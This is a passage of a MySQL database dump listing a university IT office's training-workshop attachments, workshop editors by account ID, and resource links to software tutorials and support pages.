(216, 42, 'Contribute User Training Workshop.doc', 'application/msword', 'document', 1224595367, 160768),
(220, 44, 'access1.doc', 'application/msword', 'document', 1225114967, 1343488),
(221, 44, 'retail.mdb', 'application/msaccess', 'application', 1225833616, 950272),
(222, 44, 'pledge.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application', 1225833728, 17340),
(223, 44, 'Walkers.xls', 'application/vnd.ms-excel', 'spreadsheet', 1225833848, 19968),
(224, 45, 'access2.doc', 'application/msword', 'document', 1225115362, 550400),
(225, 46, 'access3.doc', 'application/msword', 'document', 1225115809, 2282496),
(226, 46, 'filter.mdb', 'application/msaccess', 'application', 1225480994, 2281472),
(227, 47, 'access4.doc', 'application/msword', 'document', 1225115937, 1140224),
(228, 48, 'xl_intro.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application', 1222450443, 92206),
(229, 48, 'exercises.doc', 'application/msword', 'document', 1223918436, 294912),
(230, 49, 'classinfo.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application', 1222450517, 101194),
(231, 49, 'timesheet.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application', 1222450517, 14142),
(232, 49, 'excel2handout.doc', 'application/msword', 'document', 1224000062, 331776),
(233, 50, 'excel3handout.doc', 'application/msword', 'document', 1224000947, 161792),
(234, 51, 'PPT66pages.pdf', 'application/pdf', 'pdf', 1226445036, 4323975),
(235, 54, 'SelfHelpResources.pdf', 'application/pdf', 'pdf', 1212083524, 33699),
(236, 54, 'macosxquickguide.pdf', 'application/pdf', 'pdf', 1212083625, 53826),
(237, 54, 'Mac OS X 105 Outline.pdf', 'application/pdf', 'pdf', 1214339473, 41393),
(238, 54, 'macosx105overviewslides.pdf', 'application/pdf', 'pdf', 1214415378, 2665391),
(239, 55, 'MSI Application Packaging.pdf', 'application/pdf', 'pdf', 1213119545, 326678),
(240, 55, 'MSI Application Packaging Handout.pdf', 'application/pdf', 'pdf', 1213627358, 320837),
(241, 57, 'OIT-Computer-Use-Acknowledgement-v8-08-08.pdf', 'application/pdf', 'pdf', 1218574401, 45049),
(242, 67, 'it-neo-presentation.ppt', 'application/vnd.ms-powerpoint', 'presentation', 1224004109, 1298432),
(243, 91, 'Practical Encryptionv2.pdf', 'application/pdf', 'pdf', 1236711768, 5243116),
(244, 92, 'Twitter.pdf', 'application/pdf', 'pdf', 1235662289, 660993),
(245, 92, 'TwitterClassHandout.doc', 'application/octet-stream', 'application', 1235662289, 27648),
(246, 96, 'Access2007Intro.doc', 'application/msword', 'document', 1236186630, 1196544),
(247, 97, 'TrendMicro_CM_workshop200904.ppt', 'application/vnd.ms-powerpoint', 'presentation', 1241104276, 326656),
(248, 98, 'Modern Malware.pdf', 'application/pdf', 'pdf', 1240936840, 1791099),
(249, 99, 'groups_events.pdf', 'application/pdf', 'pdf', 1241544681, 773078),
(252, 43, 'billboard-sign.png', 'Sign', 'image/png', 1263306696, 224065),
(253, 43, 'NCSTATEPALETTE.pdf', 'NCSU Palette', 'application/pdf', 1263307262, 573201);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_workshop_editor`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_workshop_editor` (
  `workshopId` int(10) unsigned NOT NULL DEFAULT '0',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`workshopId`,`accountId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_workshop_editor`
--

INSERT INTO `oit_tbl_workshop_editor` (`workshopId`, `accountId`) VALUES
(38, 2294),
(38, 2354),
(39, 2294),
(39, 2354),
(40, 2847),
(42, 2211),
(44, 2206),
(45, 2206),
(46, 2206),
(47, 2206),
(52, 2129),
(52, 2285),
(52, 2847),
(54, 2249),
(54, 2847),
(55, 2847),
(55, 2918),
(57, 2748),
(57, 2847),
(58, 2748),
(58, 2847),
(59, 2372),
(59, 2764),
(59, 2847),
(60, 2285),
(62, 2372),
(63, 2285),
(63, 2806),
(63, 2847),
(64, 2313),
(65, 2649),
(66, 2285),
(66, 2806),
(68, 2285),
(69, 2313),
(70, 2806),
(70, 2847),
(74, 2285),
(74, 2847),
(74, 2918),
(75, 2285),
(75, 2847),
(75, 2918),
(76, 2309),
(77, 2130),
(77, 2285),
(78, 2319),
(79, 1991),
(80, 1991),
(81, 1991),
(84, 2130),
(86, 2130),
(87, 2130),
(93, 2423),
(97, 2423),
(98, 2867),
(100, 2249),
(102, 2130),
(105, 2055),
(106, 2055),
(106, 2847);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_workshop_link`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_workshop_link` (
  `workshopLinkId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `workshopId` int(10) unsigned NOT NULL DEFAULT '0',
  `url` mediumtext NOT NULL,
  `name` varchar(64) NOT NULL DEFAULT '',
  `order` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`workshopLinkId`),
  KEY `workshopId` (`workshopId`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=69 ;

--
-- Dumping data for table `oit_tbl_workshop_link`
--

INSERT INTO `oit_tbl_workshop_link` (`workshopLinkId`, `workshopId`, `url`, `name`, `order`) VALUES
(16, 38, 'http://www.php.net', 'PHP Homepage', 0),
(17, 38, 'http://webapps.ncsu.edu', 'Outreach Technology', 0),
(19, 39, 'http://www.php.net', 'PHP Homepage', 0),
(20, 39, 'http://webapps.ncsu.edu', 'Outreach Technology', 0),
(22, 40, 'http://a.fake.url', 'Resource 1', 0),
(23, 40, 'http://another.fake.url', 'Resource 2', 0),
(24, 38, 'http://devzone.zend.com/node/view/id/627', 'PHP 101 Tutorial', 0),
(25, 42, 'http://www.adobe.com/products/contribute/productinfo/faq/', 'Adobe Site for Contribute info', 0),
(26, 43, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'User Interface Guide', 0),
(27, 43, 'http://office.microsoft.com/en-us/getstarted/FX101923361033.aspx', 'Getting Started with Office 2007', 0),
(28, 54, 'http://www.ncsu.edu/mac/selfhelp', '10.4 Self-Help Presentation', 0),
(29, 54, 'http://www.ncsu.edu/mac/', 'OIT Macintosh Support Site', 0),
(30, 54, 'http://training.apple.com/certification/acsp', 'Apple Certified Support Professional', 0),
(31, 54, 'http://www.apple.com/findouthow/mac/#tutorial=anatomy', 'Apple Mac Basics', 0),
(32, 56, 'http://www.messagingarchitects.com/en/training/files/GW7_Quick_Reference_Card_full.pdf', 'Quick Reference PDF', 0),
(33, 56, 'http://www.ncsu.edu/oitcal', 'WolfWise web site', 0),
(35, 57, 'http://www.ncsu.edu/policies/informationtechnology/POL08.00.1.php', 'Computer Use  %u2013 POL 0...', 0),
(36, 57, 'http://www.ncsu.edu/policies/informationtechnology/REG08.00.2.php', 'Computer Use  REG 08.00.2', 0),
(37, 65, 'http://xteams.oit.ncsu.edu/oitwebsite/', 'About the OIT website', 0),
(39, 43, 'http://office.microsoft.com/search/redir.aspx?AssetID=XT102860161033&Origin=HH103338991033&CTT=5', 'Video tutiorals by Microsoft', 0),
(40, 48, 'http://office.microsoft.com/search/redir.aspx?AssetID=XT102860161033&Origin=HH103338991033&CTT=5', 'Video tutiorals by Microsoft', 0),
(41, 49, 'http://office.microsoft.com/search/redir.aspx?AssetID=XT102860161033&Origin=HH103338991033&CTT=5', 'Video tutiorals by Microsoft', 0),
(42, 50, 'http://office.microsoft.com/search/redir.aspx?AssetID=XT102860161033&Origin=HH103338991033&CTT=5', 'Video tutiorals by Microsoft', 0),
(43, 44, 'http://office.microsoft.com/search/redir.aspx?AssetID=XT102860161033&Origin=HH103338991033&CTT=5', 'Video tutiorals by Microsoft', 0),
(44, 44, 'http://office.microsoft.com/search/redir.aspx?AssetID=HA102388991033&CTT=5&Origin=HA102295841033', 'Interactive Guide (Acces 2007)', 0),
(45, 45, 'http://office.microsoft.com/en-us/access/HA102388991033.aspx', 'Interactive Guide (Access 2007)', 0),
(46, 45, 'http://www.brainstorminc.com/cbt/microsoft/index.html', 'Video tutiorals by Microsoft', 0),
(47, 46, 'http://www.brainstorminc.com/cbt/microsoft/index.html', 'Video tutiorals by Microsoft', 0),
(48, 46, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guide (Access 2007)', 0),
(49, 47, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guide (Access 2007)', 0),
(50, 47, 'http://www.brainstorminc.com/cbt/microsoft/index.html', 'Video tutiorals by Microsoft', 0),
(51, 50, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guides for 2007', 0),
(52, 49, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guide for 2007', 0),
(53, 48, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guides for 2007', 0),
(54, 51, 'http://office.microsoft.com/en-us/training/HA102295841033.aspx', 'Interactive Guides for 2007', 0),
(55, 51, 'http://www.brainstorminc.com/cbt/microsoft/index.html', 'Video tutiorals by Microsoft', 0),
(56, 43, 'http://www.customguide.com/pdf/office-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(57, 48, 'http://www.customguide.com/pdf/excel-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(58, 49, 'http://www.customguide.com/pdf/excel-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(59, 50, 'http://www.customguide.com/pdf/excel-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(60, 44, 'http://www.customguide.com/pdf/access-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(61, 51, 'http://www.customguide.com/pdf/powerpoint-quick-reference-2007.pdf', 'Quick Reference Card', 0),
(62, 74, 'http://docs.google.com/Presentation?id=dcc6gqr_0c45tmtdv', 'Class Slides', 0),
(63, 79, 'http://vcl.ncsu.edu', 'VCL - Virtual Computing Lab', 0),
(64, 79, 'http://technet.microsoft.com/en-us/library/cc766320.aspx', 'Technet - Server 2003 Guide', 0),
(65, 79, 'http://technet.microsoft.com/en-us/library/cc771670.aspx', 'Technet - Server 2008 Guide', 0),
(66, 84, 'http://www.chrisdonald.net/vdcg_cs3_p1_student_guide.pdf', 'Class Handout - Optional to bring to class', 0),
(67, 94, 'http://developer.apple.com/iphone/program/', 'iPhone Developer Program', 0),
(68, 94, 'http://developer.apple.com', 'Apple Developers', 0);
